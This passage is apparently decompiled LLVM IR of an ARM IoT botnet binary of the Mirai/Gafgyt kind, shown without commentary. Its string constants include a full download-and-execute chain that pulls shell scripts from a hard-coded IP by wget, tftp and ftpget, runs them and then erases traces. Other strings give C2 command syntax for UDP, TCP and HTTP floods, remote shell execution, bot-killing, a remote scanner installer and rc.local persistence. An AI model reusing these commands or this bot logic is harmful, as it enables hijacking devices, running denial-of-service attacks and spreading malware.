x i8]* @global_var_2523c.816, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_25254.817, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_252c8.818, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @global_var_2533c.819, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_249e8.797, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_24a68.798, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_24ae8.799, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_24b68.800, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_24be8.801, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_24c68.802, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @global_var_24ce8.803, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @global_var_24d60.804, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @global_var_24dcc.805, i32 0, i32 0), i8* getelementptr inbounds ([127 x i8], [127 x i8]* @global_var_24e40.806, i32 0, i32 0), i8* getelementptr inbounds ([59 x i8], [59 x i8]* @global_var_24ec0.807, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1ea2c.519, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_23630.742, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_24efc.808, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @global_var_24f44.809, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @global_var_232fc.734, i32 0, i32 0), i8* getelementptr inbounds ([208 x i8], [208 x i8]* @global_var_24f88.810, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_25058.811, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @global_var_22c78.717, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_250b4.812, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @global_var_22fd0.726, i32 0, i32 0)]
@global_var_1e9c4.822 = constant [6 x i8] c"close\00"
@global_var_1e9cc.823 = constant [11 x i8] c"keep-alive\00"
@global_var_1e9d8.824 = constant [7 x i8] c"accept\00"
@global_var_1e9e0.825 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e9c4.822, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e9cc.823, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e9d8.824, i32 0, i32 0)]
@global_var_25dd0.830 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_25e10.832 = constant [439 x i8] c"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://45.32.213.61/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 45.32.213.61 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 45.32.213.61; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.32.213.61 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c\00"
@global_var_25fc8.834 = constant [4 x i8] c"%d\0A\00"
@global_var_25fcc.836 = constant [7 x i8] c"PYTHON\00"
@global_var_25fd4.838 = constant [8 x i8] c"INSTALL\00"
@global_var_25fdc.840 = constant [130 x i8] c"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 45.32.213.61/good2.py\00"
@global_var_26060.843 = constant [26 x i8] c"INSTALLING PYTHON SCANNER\00"
@global_var_2607c.845 = constant [7 x i8] c"UPDATE\00"
@global_var_26084.847 = constant [47 x i8] c"cd /.tmp;rm -rf *py;wget 45.32.213.61/good2.py\00"
@global_var_260b4.849 = constant [24 x i8] c"UPDATING PYTHON SCANNER\00"
@global_var_260cc.851 = constant [4 x i8] c"OFF\00"
@global_var_260d0.853 = constant [31 x i8] c"killall -9 python;pkill python\00"
@global_var_260f0.855 = constant [24 x i8] c"STOPPING PYTHON SCANNER\00"
@global_var_26108.857 = constant [6 x i8] c"START\00"
@global_var_26110.859 = constant [40 x i8] c"cd /.tmp;python good2.py 1000 LUCKY 1 3\00"
@global_var_26138.861 = constant [28 x i8] c"STARTING VOIDS HACKA SCANNA\00"
@global_var_26154.864 = constant [6 x i8] c"PONG!\00"
@global_var_2615c.866 = constant [6 x i8] c"TABLE\00"
@global_var_26164.868 = constant [3 x i8] c"%d\00"
@global_var_26168.870 = constant [25 x i8] c"UPDATE TAKEN SUCCESFULLY\00"
@global_var_26184.872 = constant [8 x i8] c"SCANNER\00"
@global_var_2e7d4.874 = global i32 0
@global_var_2618c.876 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_261a0.878 = constant [3 x i8] c"ON\00"
@global_var_261a4.881 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_261c0.883 = constant [6 x i8] c"NETIS\00"
@global_var_261c8.885 = constant [23 x i8] c"STOPPING NETIS SCANNER\00"
@global_var_261e0.887 = constant [23 x i8] c"STARTING NETIS SCANNER\00"
@global_var_261f8.889 = constant [8 x i8] c"REMOVER\00"
@global_var_26200.891 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_26220.893 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_2622c.895 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_26240.897 = constant [4 x i8] c"UDP\00"
@global_var_26244.899 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_262b8.902 = constant [4 x i8] c"TCP\00"
@global_var_262bc.904 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_26378.906 = constant [5 x i8] c"HTTP\00"
@global_var_26380.908 = constant [4 x i8] c"CNC\00"
@global_var_26384.910 = constant [27 x i8] c"CNC <target> <port> <time>\00"
@global_var_263a0.912 = constant [4 x i8] c"STD\00"
@global_var_263a4.914 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_263c0.916 = constant [9 x i8] c"KILLATTK\00"
@global_var_263cc.921 = constant [11 x i8] c"Killed %d.\00"
@global_var_263d8.923 = constant [13 x i8] c"None Killed.\00"
@global_var_263e8.925 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_281f0.928 = local_unnamed_addr global i32 -1
@global_var_281ec.930 = global [18 x i8]* @global_var_1d810.501
@global_var_263f4.932 = constant [8 x i8] c"8.8.8.8\00"
@global_var_263fc.935 = constant [16 x i8] c"/proc/net/route\00"
@global_var_2640c.937 = constant [11 x i8] c"\0900000000\09\00"
@global_var_28580.939 = global i32 0
@global_var_26418.941 = constant [7 x i8] c"Device\00"
@global_var_26420.943 = constant i32 0
@global_var_26424.945 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_2643c.949 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_2644c.951 = constant i32 47
@global_var_26450.953 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_26458.955 = constant i32 97
@global_var_2645c.957 = constant [13 x i8] c"fork failed\0A\00"
@global_var_2646c.961 = constant [16 x i8] c"Connected %s:%s\00"
@global_var_2647c.966 = constant [5 x i8] c"PONG\00"
@global_var_26484.968 = constant [4 x i8] c"DUP\00"
@global_var_26488.970 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_2649c.972 = constant [3 x i8] c"SH\00"
@global_var_264a0.974 = constant [8 x i8] c"%s 2>&1\00"
@global_var_264a8.976 = constant [3 x i8] c"%s\00"
@global_var_264ac.978 = constant i32 32
@global_var_28010.981 = global i32 0
@global_var_13df4.992 = constant i32 -382906384
@global_var_15e54.996 = constant i32 -382909968
@global_var_20003.1002 = constant [13 x i8] c"kolibri.com/\00"
@global_var_20000.1003 = constant [16 x i8] c"redkolibri.com/\00"
@global_var_1275c.1013 = constant i32 -509607926
@global_var_1292c.1024 = constant i32 -382910448
@global_var_185a0.1025 = constant i32 -382909968
@global_var_18654.1031 = constant i32 -382910224
@global_var_13b64.1065 = constant i32 -509607928
@global_var_1420c.1092 = constant i32 -456978431
@global_var_14f78.1127 = constant i32 -478871519
@global_var_158c4.1135 = constant i32 -478805983
@global_var_15ca0.1144 = constant i32 -382906384
@global_var_120a0.1153 = constant i32 -509591552
@global_var_16260.1159 = constant i32 -442564540
@global_var_1f31d.1189 = constant [59 x i8] c"pera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00"
@global_var_16b08.1204 = constant i32 -494075872
@global_var_120cc.1205 = constant i32 -382910336
@global_var_16cc8.1217 = constant i32 -369098421
@global_var_160d0.1237 = constant i32 -442543860
@global_var_10af4.1243 = constant i32 -369098639
@global_var_142c0.1247 = constant i32 -369093530
@global_var_17790.1260 = constant i32 -335545191
@global_var_17d50.1275 = constant i32 -443088884
@global_var_1a544.1325 = constant i32 -382909456
@global_var_12104.1348 = constant i32 -382910336
@global_var_1b9a8.1353 = constant i32 -442695584
@global_var_1bf70.1362 = constant i32 -382910224
@global_var_1cdc4.1388 = constant i32 -504313148
@global_var_1cdac.1389 = constant i32 -483131392
@global_var_1cc58.1390 = constant i32 -481229311
@global_var_1ce34.1391 = constant i32 -477817729
@global_var_1cf34.1392 = constant i32 -476034303
@global_var_1d170.1393 = constant i32 -516685812
@global_var_1d064.1394 = constant i32 -905969571
@global_var_1cf98.1395 = constant i32 -528203771
@global_var_1d1f8.1396 = constant i32 -478079873
@global_var_1d1dc.1397 = constant i32 -534704125
@global_var_1d18c.1398 = constant i32 -534704125
@global_var_1d124.1399 = constant i32 -483131392
@global_var_28550.3 = external global i8*
@global_var_28586.75 = external global i8*
@global_var_28587.76 = local_unnamed_addr global i8 0
@global_var_28588.77 = local_unnamed_addr global i8 0
@global_var_28589.78 = local_unnamed_addr global i8 0
@global_var_2858a.79 = local_unnamed_addr global i8 0
@global_var_26438.947 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d4 = load i32, i32* @r0, align 4
  ret i32 %v1_80d4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d8 = load i32, i32* @r0, align 4
  ret i32 %v1_80d8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80dc = load i32, i32* @r0, align 4
  ret i32 %v1_80dc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_80e0 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_80e0)
  %v1_80e0 = load i32, i32* @r0, align 4
  ret i32 %v1_80e0
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_80e4 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v1_80e4 = load i32, i32* @r0, align 4
  ret i32 %v1_80e4
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_80e8 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_80e8)
  %v1_80e8 = load i32, i32* @r0, align 4
  ret i32 %v1_80e8
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_80ec = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_80ec)
  %v1_80ec = load i32, i32* @r0, align 4
  ret i32 %v1_80ec
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_80f0 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_80f0)
  %v1_80f0 = load i32, i32* @r0, align 4
  ret i32 %v1_80f0
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_80f4 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_80f4)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_80f8 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_80f8)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_80fc = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_80fc)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_810c = load i32, i32* @r4, align 4
  store i32 %v3_810c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_28550.3 to i32), i32* %r4.global-to-local, align 4
  %v2_8114 = load i8, i8* bitcast (i8** @global_var_28550.3 to i8*), align 4
  %v2_8118 = icmp eq i8 %v2_8114, 0
  br i1 %v2_8118, label %dec_label_pc_8120, label %dec_label_pc_813c

dec_label_pc_8120:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8138 = load i32, i32* %r4.global-to-local, align 4
  %v3_8138 = inttoptr i32 %v2_8138 to i8*
  store i8 1, i8* %v3_8138, align 1
  %v2_813c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_813c

dec_label_pc_813c:                                ; preds = %entry, %dec_label_pc_8120
  %v2_813c = phi i32 [ %v3_810c, %entry ], [ %v2_813c.pre, %dec_label_pc_8120 ]
  store i32 %v2_813c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_28550.3, { 1, 0 }
  uselistorder label %dec_label_pc_813c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8174 = load i32, i32* @global_var_2800c.13, align 4
  %v2_8178 = icmp eq i32 %v2_8174, 0
  br i1 %v2_8178, label %dec_label_pc_8190, label %dec_label_pc_8180

dec_label_pc_8180:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8190

dec_label_pc_8190:                                ; preds = %bb, %dec_label_pc_8180
  ret i32 ptrtoint (i32* @global_var_2800c.13 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2800c.13, { 1, 0 }
  uselistorder label %dec_label_pc_8190, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81d8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_10d1c.17 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32948, i32 120232, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @abort()
  ret i32 %v0_81dc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81fc, i32* @global_var_2858c.20, align 4
  %v1_821c = add i32 %v0_81fc, -1640531527
  store i32 %v1_821c, i32* @global_var_28590.21, align 4
  %v1_8238 = add i32 %v0_81fc, 1013904242
  store i32 %v1_8238, i32* @global_var_28594.22, align 4
  br label %dec_label_pc_8250

dec_label_pc_8250:                                ; preds = %entry, %dec_label_pc_8250
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8294, %dec_label_pc_8250 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8260 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_2858c.20 to i32), i32 -12)
  %v6_8260 = inttoptr i32 %v5_8260 to i32*
  %v7_8260 = load i32, i32* %v6_8260, align 4
  %tmp10 = mul i32 %storemerge12, 4
  %v5_8270 = add i32 %tmp10, add (i32 ptrtoint (i32* @global_var_2858c.20 to i32), i32 -8)
  %v6_8270 = inttoptr i32 %v5_8270 to i32*
  %v7_8270 = load i32, i32* %v6_8270, align 4
  %v2_8274 = xor i32 %storemerge12, -1640531527
  %v2_827c = xor i32 %v2_8274, %v7_8260
  %v2_8284 = xor i32 %v2_827c, %v7_8270
  %v5_828c = mul nuw nsw i32 %storemerge12, 4
  %v6_828c = add i32 %v5_828c, ptrtoint (i32* @global_var_2858c.20 to i32)
  %v7_828c = inttoptr i32 %v6_828c to i32*
  store i32 %v2_8284, i32* %v7_828c, align 4
  %v1_8294 = add nuw nsw i32 %storemerge12, 1
  %v7_82ac = icmp slt i32 %v1_8294, 4096
  br i1 %v7_82ac, label %dec_label_pc_8250, label %dec_label_pc_82b0

dec_label_pc_82b0:                                ; preds = %dec_label_pc_8250
  %v1_82b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_82b8

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8250, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %v2_82f4 = load i32, i32* @global_var_282f0.25, align 4
  %v1_82f8 = add i32 %v2_82f4, 1
  %v3_8300 = urem i32 %v1_82f8, 4096
  store i32 %v3_8300, i32* @global_var_282f0.25, align 4
  %v4_8318 = mul nuw nsw i32 %v3_8300, 4
  %v5_8318 = add i32 %v4_8318, ptrtoint (i32* @global_var_2858c.20 to i32)
  %v6_8318 = inttoptr i32 %v5_8318 to i32*
  %v7_8318 = load i32, i32* %v6_8318, align 4
  %v6_8338 = udiv i32 %v7_8318, 228675
  store i32 %v6_8338, i32* @global_var_282ec.28, align 4
  br i1 true, label %dec_label_pc_83c8, label %dec_label_pc_83a8

dec_label_pc_83a8:                                ; preds = %entry
  br label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %entry, %dec_label_pc_83a8
  %v4_83e8 = mul nuw nsw i32 %v3_8300, 4
  %v5_83e8 = add i32 %v4_83e8, ptrtoint (i32* @global_var_2858c.20 to i32)
  %v6_83e8 = inttoptr i32 %v5_83e8 to i32*
  %v7_83e8 = load i32, i32* %v6_83e8, align 4
  ret i32 %v7_83e8

; uselistorder directives
  uselistorder i32 %v3_8300, { 0, 2, 1 }
  uselistorder i32* @global_var_2858c.20, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2858c.20 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_83c8, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_8428 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8448

dec_label_pc_8448:                                ; preds = %dec_label_pc_8448, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8440, %dec_label_pc_8448 ]
  %v2_8454 = add i32 %stack_var_-24.0, %tmp
  %v1_8458 = inttoptr i32 %v2_8454 to i8*
  %v2_8458 = load i8, i8* %v1_8458, align 1
  %v3_8458 = zext i8 %v2_8458 to i32
  store i32 %v3_8458, i32* %r0.global-to-local, align 4
  %v1_8460 = call i32 @isspace(i32 %v3_8458)
  store i32 %v1_8460, i32* %r0.global-to-local, align 4
  %v2_8468 = icmp eq i32 %v1_8460, 0
  %v1_8440 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8468, label %dec_label_pc_8480.preheader, label %dec_label_pc_8448

dec_label_pc_8480.preheader:                      ; preds = %dec_label_pc_8448
  %v1_8430 = add i32 %v3_8428, -1
  %v5_848c10 = icmp slt i32 %v1_8430, %stack_var_-24.0
  br i1 %v5_848c10, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8474:                                ; preds = %dec_label_pc_8490
  %v1_8478 = add i32 %stack_var_-20.011, -1
  %v5_848c = icmp slt i32 %v1_8478, %stack_var_-24.0
  br i1 %v5_848c, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8480.preheader, %dec_label_pc_8474
  %stack_var_-20.011 = phi i32 [ %v1_8478, %dec_label_pc_8474 ], [ %v1_8430, %dec_label_pc_8480.preheader ]
  %v2_849c = add i32 %stack_var_-20.011, %tmp
  %v1_84a0 = inttoptr i32 %v2_849c to i8*
  %v2_84a0 = load i8, i8* %v1_84a0, align 1
  %v3_84a0 = zext i8 %v2_84a0 to i32
  store i32 %v3_84a0, i32* %r0.global-to-local, align 4
  %v1_84a8 = call i32 @isspace(i32 %v3_84a0)
  store i32 %v1_84a8, i32* %r0.global-to-local, align 4
  %v2_84b0 = icmp eq i32 %v1_84a8, 0
  br i1 %v2_84b0, label %dec_label_pc_8500.preheader, label %dec_label_pc_8474

dec_label_pc_8500.preheader:                      ; preds = %dec_label_pc_8474, %dec_label_pc_8490, %dec_label_pc_8480.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8430, %dec_label_pc_8480.preheader ], [ %v1_8478, %dec_label_pc_8474 ], [ %stack_var_-20.011, %dec_label_pc_8490 ]
  br label %dec_label_pc_8500

dec_label_pc_84c4:                                ; preds = %dec_label_pc_8500
  %v2_84e8 = add i32 %storemerge1, %tmp
  %v1_84ec = inttoptr i32 %v2_84e8 to i8*
  %v2_84ec = load i8, i8* %v1_84ec, align 1
  %v3_84f0 = inttoptr i32 %v2_8524 to i8*
  store i8 %v2_84ec, i8* %v3_84f0, align 1
  %v1_84f8 = add i32 %storemerge1, 1
  br label %dec_label_pc_8500

dec_label_pc_8500:                                ; preds = %dec_label_pc_8500.preheader, %dec_label_pc_84c4
  %storemerge1 = phi i32 [ %v1_84f8, %dec_label_pc_84c4 ], [ %stack_var_-24.0, %dec_label_pc_8500.preheader ]
  %v7_850c = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_8518 = sub i32 %storemerge1, %stack_var_-24.0
  %v2_8524 = add i32 %v2_8518, %tmp
  br i1 %v7_850c, label %dec_label_pc_8510, label %dec_label_pc_84c4

dec_label_pc_8510:                                ; preds = %dec_label_pc_8500
  %v3_852c = inttoptr i32 %v2_8524 to i8*
  store i8 0, i8* %v3_852c, align 1
  %v1_8538 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_8538

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8430, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8500, { 1, 0 }
  uselistorder label %dec_label_pc_8500.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8490, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_853c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_853c, i32* @ip, align 4
  %v0_854c = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8558 = icmp eq i32 %v0_854c, 0
  br i1 %v2_8558, label %dec_label_pc_858c, label %dec_label_pc_8560

dec_label_pc_8560:                                ; preds = %entry
  %v1_8564 = inttoptr i32 %v0_854c to i32*
  %v2_8564 = load i32, i32* %v1_8564, align 4
  %v1_8570 = trunc i32 %arg2 to i8
  %v3_8570 = inttoptr i32 %v2_8564 to i8*
  store i8 %v1_8570, i8* %v3_8570, align 1
  %v2_8578 = load i32, i32* %v1_8564, align 4
  %v1_857c = add i32 %v2_8578, 1
  store i32 %v1_857c, i32* %v1_8564, align 4
  %v1_85a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_858c:                                ; preds = %entry
  %v2_8548 = ptrtoint i32* %stack_var_-24 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_859c = call i32 @__GI_write(i32 1, i32 %v2_8548)
  store i32 %v2_859c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8560, %dec_label_pc_858c
  %v1_85a8 = phi i32 [ %v1_85a8.pre, %dec_label_pc_8560 ], [ %v2_859c, %dec_label_pc_858c ]
  ret i32 %v1_85a8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_85a0, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_85ac = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_85ac, i32* @ip, align 4
  %v3_85b0 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_8668, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %entry
  %v2_861819 = load i8, i8* %arg2, align 1
  %v2_861c21 = icmp eq i8 %v2_861819, 0
  br i1 %v2_861c21, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_85fc:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_85fc
  %v4_861423 = phi i32 [ %v1_860c, %dec_label_pc_85fc ], [ %tmp, %dec_label_pc_85e8 ]
  %stack_var_-40.022 = phi i32 [ %v1_8600, %dec_label_pc_85fc ], [ 0, %dec_label_pc_85e8 ]
  %v1_8600 = add i32 %stack_var_-40.022, 1
  %v1_860c = add i32 %v4_861423, 1
  %v5_8610 = inttoptr i32 %v1_860c to i8*
  %v2_8618 = load i8, i8* %v5_8610, align 1
  %v2_861c = icmp eq i8 %v2_8618, 0
  br i1 %v2_861c, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_8624:                                ; preds = %dec_label_pc_85fc, %dec_label_pc_85e8
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85e8 ], [ %v1_8600, %dec_label_pc_85fc ]
  %v5_8630 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8630, label %dec_label_pc_8640, label %dec_label_pc_8650

dec_label_pc_8640:                                ; preds = %dec_label_pc_8624
  %v2_8648 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8650

dec_label_pc_8650:                                ; preds = %dec_label_pc_8624, %dec_label_pc_8640
  %storemerge3 = phi i32 [ %v2_8648, %dec_label_pc_8640 ], [ 0, %dec_label_pc_8624 ]
  %v1_8654 = and i32 %arg4, 2
  %v2_8658 = icmp eq i32 %v1_8654, 0
  br i1 %v2_8658, label %dec_label_pc_8668, label %dec_label_pc_8660

dec_label_pc_8660:                                ; preds = %dec_label_pc_8650
  br label %dec_label_pc_8668

dec_label_pc_8668:                                ; preds = %dec_label_pc_8650, %entry, %dec_label_pc_8660
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_8650 ], [ %storemerge3, %dec_label_pc_8660 ]
